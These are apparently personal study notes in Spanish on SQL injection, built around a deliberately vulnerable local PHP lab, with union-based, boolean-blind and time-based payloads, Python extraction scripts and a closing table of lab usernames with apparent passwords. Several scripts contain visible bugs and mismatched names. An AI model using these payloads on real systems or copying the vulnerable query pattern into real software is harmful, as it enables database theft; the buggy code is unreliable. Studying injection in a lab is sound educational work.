> Inyección SQL es un método de infiltración de código intruso que se vale de una vulnerabilidad informática presente en una aplicación en el nivel de validación de las entradas para realizar operaciones sobre una base de datos.​


## Preparando el ambiente
```
sudo apt install mariadb-server php-mysql apache2
```

- Iniciando servidor de mariadb y apache 2 
```
service mysql start
lsof -i:3306
```
- Para iniciar un servicio de mariadb y verificarlo
```
service apache2 start
lsof -i:80
```
- Lo mismo para iniciar un servicio de apache2
- Luego ingresamos al servicio de mysql
```
mysql -uroot -p
```

## Comandos mysql
- `show databases;` - Para ver todas las bases de datos (creadas por defecto) 
- `use mysql;` - Para utilizar una base de dato 
- `show tables;` - Listas las tablas disponibles 
- `describe user;` - Ver las columnas 
- `select user,password from user;` - Ver informacion de una tablas eligiendo las columnas 
- `select user,password from user where user = 'admin';` - Confirmar si existe un usuario 
- `create Database Hacking;` - Crear una db 
- `use Hacking;`
- `create table users(id int(8), name varchar(10), password varchar(8));` - Crear una tabla con las columnas y el tipo de dato
- `insert into users(id, name, password) values(1, 'admin', 'admin123');` - Agregar valores 
- `update users set name='cele' where id=1;` - Modificar un valor en una columna 

---
## Conectar la bd con apache2 mediante php
`create user 'universo'@'localhost' identified by 'paralelo22';`
Para darle todos los privilegios a ese usuario
`grant all privileges on Hacking.* to 'universo'@'localhost'`

---
## Crear un script en php para buscar usuarios
`cd /var/www/html`
`nvim searchUsers.php`
```php
<?php
	$server = "localhost";
	$username = "universo22";
	$password = "paralelo22";
	$database = "Hacking";

	$conn = new mysqli($server, $username, $password, $database);
	$id = $_GET['id'];
	$data = mysqli_query($conn, "select password from Users where id='$id'") or die(mysqli_error($conn));
	$response = mysqli_fetch_array($data);
	echo $response['username'];
?>
```
- En el navegador en `localhost/searchUsers.php?id=1` deberia devolverte la password para ese usuario.

---
## Inyecciones maliciosas
- `/searchUsers.php?name=admin'` - la tilde produce un error en la sintaxis
- `/searchUsers.php?name=admin' order by 100; -- -` - lo que hacen los dash es convertir a comentario todo lo que sigue despues, entonces podemos inyectar la query que queremos.
- **El objetivo es descubrir cuantas columnas hay**
- `/searchUsers.php?name=admin' union select 1; #`
- `/searchUsers.php?name=admin' union select database(); #`
- `/searchUsers.php?name=admin' union select group_concat(schema_name) from information_schema.schemata; -- -`
- `/searchUsers.php?name=admin' union select group_concat(table_name) from information_schema.tables where table_schema='Hacking'; -- -`
- `/searchUsers.php?name=admin' union select group_concat(column_name) from information_schema.columns where table_schema='Hacking' and table_name='Users'; -- -`
- `/searchUsers.php?name=admin' union select group_concat(name) from Users; -- -`
- ``/searchUsers.php?name=admin' union select group_concat(name, ':', password) from Users; -- -``

---
## Sanitizando el script php
- `$id = mysqli_real_escape_string($conn, $_GET['id']);`

---
## Que pasa cuando no me muestran resultados?
- Hay webs que cuando se hace una peticion y no encuentra nada utiliza un error 404
```php
if ( ! isset($response['username']) ){
	http_response_code(404);
}
```
- `curl -s -X GET 'http://localhost/searchUsers.php?id=1' -I` para ver el tipo de respuesta de una query
- El problema cuando sucede esto es que no obtenemos datos, solo un codigo error

---
## SQLI blind boolean
- Con esta pagina podemos crear tablas temporales y probar queries, [Click](https://extendsclass.com/mysql-online.html)
- `select(select substr(firstname,1,1) from scientist where id = 1)='a';`
- Si hay problemas con las comillas
	- `select(select ascii(substr(firstname,1,1)) from scientist where id = 1)=97;`
- Mediante curl
	- `curl -s -X GET 'http://localhost/searchUsers.php' -G --data-urlencode "id=9"`
	- `curl -s -X GET 'http://localhost/searchUsers.php' -G --data-urlencode "id=9 or 1=1"`
	- `curl -s -X GET 'http://localhost/searchUsers.php' -G --data-urlencode "id=9 or (select(select ascii(substr(firstname,1,1)) from scientist where id = 1)=97)"`

---
## Script en Python
```python
#!/usr/bin/python3

from pwn import *
import time
import requests
import signal
import sys
import string

def handler(sig, frame):
	print("\n[!] Saliendo...\n")
	sys.exit(1)

# ctrl+c
signal.signal(signal.SIGINT, handler)

# variables globales
url = "http://localhost/searchUsers.php"
# characters = string.printable 
# 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c

def makeSQLI():
	p1 = log.process("Fuerza bruta")
	p1.status("Proceso en marcha: ")
	time.sleep(2)
	
	p2 = log.process("Datos extraidos: ")
	extracted_data = ""

	for position in range(1,150):
		for character in range(33,126):
			whole_request = url + '?id=9 or (select(select ascii(substr(select group_concat(username,0x3a,password) from users,%d,1))=%d)' & (position, character)
			response = request.get(whole_request)
			p1.status(whole_request)
			
			if response.status_code == 200:
				extracted_data += chr(character)
				p2.status(extracted_data)
				break

if __name__ == "__main__":
	makeSQLI()
```

- Podes modificar esta linea para listar todos los usuarios e ir cambiando la columna
- **?id=9 or (select(select ascii(substring(select group_concat(`username`) from user,%d,1)) from scientist where id = 1)=%d)**

---
## SQLI por tiempos
- A veces nos podemos dar cuenta si una query da error o no dependiendo del tiempo que tarda el servidor en responder
- `?id=1 and if(ascii(substring(database(),1,1))=72,sleep(5),1)` 
```python
for position in range(1,150):
		for character in range(33,126):
			whole_request = url + '?id=1 and if(ascii(substr(database(),%d,1))=%d,sleep(0.35),1)`' & position, character
			time_start = time.time()
			response = request.get(whole_request)
			time_end = time.time()
			p1.status(whole_request)
			
			if time_end - time_start > 0.35:
				extracted_data += chr(character)
				p2.status(extracted_data)
				break
```

| carlos        | jd7ls3ccufv248ru5xch |
| ------------- | -------------------- |
| wiener        | 3cdx56y3fbqtqqtwrv38 |
| administrator | u2e9lsotsvgvoqdbrxhc |
|               |                      |
| administrator | 82y48x0ni4wp3hvlxlr4 |
| carlos        | 8ecgsd8fybs2vkh8q1za |
| wiener        | 4v2owueq9q10mnygceqq |
